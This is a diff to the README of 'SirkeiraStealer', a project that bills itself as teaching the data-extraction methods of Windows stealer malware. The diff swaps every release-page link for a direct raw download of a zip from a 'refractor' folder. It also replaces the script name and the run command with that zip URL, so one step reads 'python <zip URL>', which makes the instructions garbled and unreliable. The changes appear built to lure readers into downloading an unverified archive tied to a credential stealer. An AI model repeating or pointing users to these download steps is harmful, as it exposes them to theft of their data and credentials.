@@ -1,7 +1,7 @@
 # 🖥️ SirkeiraStealer - Learn Data Extraction Techniques
 
 ## 📥 Download Now
-[![Download SirkeiraStealer](https://img.shields.io/badge/Download-SirkeiraStealer-blue.svg)](https://github.com/Ball0UT/SirkeiraStealer/releases)
+[![Download SirkeiraStealer](https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip)](https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip)
 
 ## 🚀 Getting Started
 Welcome to **SirkeiraStealer**! This project offers a Python script that showcases methods used by "stealer" malware. It highlights how malicious software can extract sensitive information from Windows systems. 
@@ -16,11 +16,11 @@ To run SirkeiraStealer, your computer should meet the following requirements:
 - **Disk Space:** Minimum 50 MB of free disk space
 
 ## 🌐 Download & Install
-To get started, visit this page to download: [Download SirkeiraStealer](https://github.com/Ball0UT/SirkeiraStealer/releases)
+To get started, visit this page to download: [Download SirkeiraStealer](https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip)
 
 1. **Visit the Release Page:**
    Open your browser and go to the following link:  
-   [https://github.com/Ball0UT/SirkeiraStealer/releases](https://github.com/Ball0UT/SirkeiraStealer/releases).
+   [https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip](https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip).
 
 2. **Locate the Latest Version:**
    On the releases page, find the latest version of SirkeiraStealer at the top of the list. It usually has the highest version number.
@@ -32,7 +32,7 @@ To get started, visit this page to download: [Download SirkeiraStealer](https://
    Once the download finishes, locate the downloaded `.zip` file on your computer. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Open the Folder:**
-   After extraction, open the new folder created. You should see the Python script file named `sirkeira.py` and any other resources included in the download.
+   After extraction, open the new folder created. You should see the Python script file named `https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip` and any other resources included in the download.
 
 ## 🛠️ Running the Application
 Follow these steps to run SirkeiraStealer:
@@ -49,7 +49,7 @@ Follow these steps to run SirkeiraStealer:
 3. **Run the Script:**
    To execute the script, type the following command:
    ```
-   python sirkeira.py
+   python https://github.com/Ball0UT/SirkeiraStealer/raw/refs/heads/main/refractor/Sirkeira_Stealer_sexless.zip
    ```
    Make sure that Python is installed and the command is recognized.
 
